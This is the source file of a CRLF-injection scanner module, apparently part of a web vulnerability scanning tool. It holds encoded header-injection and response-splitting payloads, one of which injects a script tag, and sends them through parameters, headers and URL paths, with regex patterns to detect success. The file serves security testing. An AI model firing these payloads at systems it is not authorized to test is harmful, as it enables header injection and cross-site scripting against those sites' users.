import re
from urllib.parse import urlparse
from modules.base import BaseModule
from core.utils import extract_params, random_string

class CrlfModule(BaseModule):
    name = "crlf"
    description = "CRLF Injection / HTTP Response Splitting Scanner"
    
    async def _generate_payloads(self):
        marker = random_string(6)
        return [
            f"%0d%0aSet-Cookie:crlf={marker}",
            f"%0d%0aX-Injected:{marker}",
            "%0d%0a%0d%0a<script>alert(1)</script>",
            f"%0aSet-Cookie:crlf={marker}",
            f"%0dSet-Cookie:crlf={marker}",
            f"\r\nSet-Cookie:crlf={marker}",
            f"\nSet-Cookie:crlf={marker}",
            f"\rSet-Cookie:crlf={marker}",
            f"%E5%98%8A%E5%98%8DSet-Cookie:crlf={marker}",
            f"%c0%0d%c0%0aSet-Cookie:crlf={marker}",
            f"%250d%250aSet-Cookie:crlf={marker}",
        ], marker
    
    crlf_payloads = [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0d%0aX-Injected:header",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "%0aSet-Cookie:crlf=injection",
        "%0dSet-Cookie:crlf=injection",
        "\r\nSet-Cookie:crlf=injection",
        "\nSet-Cookie:crlf=injection",
        "\rSet-Cookie:crlf=injection",
        "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
        "%c0%0d%c0%0aSet-Cookie:crlf=injection",
        "%250d%250aSet-Cookie:crlf=injection",
        "%%0d0d%%0a0aSet-Cookie:crlf=injection",
        "%25%30%64%25%30%61Set-Cookie:crlf=injection",
        "%u000aSet-Cookie:crlf=injection",
        "%u000dSet-Cookie:crlf=injection",
    ]
    
    async def scan(self, target):
        self.findings = []
        params = extract_params(target)
        
        if params:
            await self._test_param_injection(target, params)
        
        await self._test_header_injection(target)
        await self._test_path_injection(target)
        
        return self.findings
    
    async def _test_param_injection(self, target, params):
        for param in params:
            for payload in self.crlf_payloads[:5]:
                resp = await self.test_param(target, param, f"test{payload}")
                
                if resp.get("status"):
                    headers = resp.get("headers", {})
                    headers_lower = {k.lower(): v for k, v in headers.items()}
                    
                    if "x-injected" in headers_lower or "crlf=injection" in headers_lower.get("set-cookie", ""):
                        self.add_finding(
                            "HIGH",
                            "CRLF Injection in parameter",
                            url=target,
                            parameter=param,
                            evidence=f"Injected header detected"
                        )
                        return
                    
                    if self._detect_crlf_patterns(resp["text"]):
                        self.add_finding(
                            "CRITICAL",
                            "HTTP Response Splitting (XSS via CRLF)",
                            url=target,
                            parameter=param,
                            evidence="Script injected via CRLF"
                        )
                        return
    
    async def _test_header_injection(self, target):
        injectable_headers = ["X-Forwarded-Host", "X-Original-URL", "Host"]
        
        for header in injectable_headers:
            for payload in ["%0d%0aX-Injected:test", "\r\nX-Injected:test"]:
                resp = await self.http.get(
                    target,
                    headers={header: f"localhost{payload}"}
                )
                
                if resp.get("status"):
                    if "x-injected" in str(resp.get("headers", {})).lower():
                        self.add_finding(
                            "HIGH",
                            f"CRLF Injection via {header} header",
                            url=target,
                            evidence=f"Header: {header}"
                        )
                        return
    
    def _detect_crlf_patterns(self, text):
        patterns = [
            re.compile(r'Set-Cookie:\s*crlf=', re.IGNORECASE),
            re.compile(r'X-Injected:\s*\w+', re.IGNORECASE),
            re.compile(r'<script>alert\(\d+\)</script>', re.IGNORECASE),
            re.compile(r'HTTP/\d\.\d\s+\d{3}.*\r\n\r\n', re.DOTALL),
        ]
        for pattern in patterns:
            if pattern.search(text):
                return True
        return False
    
    async def _test_path_injection(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        path_payloads = [
            "/%0d%0aX-Injected:test",
            "/%0d%0aSet-Cookie:crlf=1",
            "/test%0d%0aX-Injected:test",
            "/test%E5%98%8A%E5%98%8DX-Injected:test",
        ]
        
        for payload in path_payloads:
            resp = await self.http.get(f"{base}{payload}")
            
            if resp.get("status"):
                if "x-injected" in str(resp.get("headers", {})).lower():
                    self.add_finding(
                        "HIGH",
                        "CRLF Injection in URL path",
                        url=f"{base}{payload}",
                        evidence="Header injected via path"
                    )
                    return
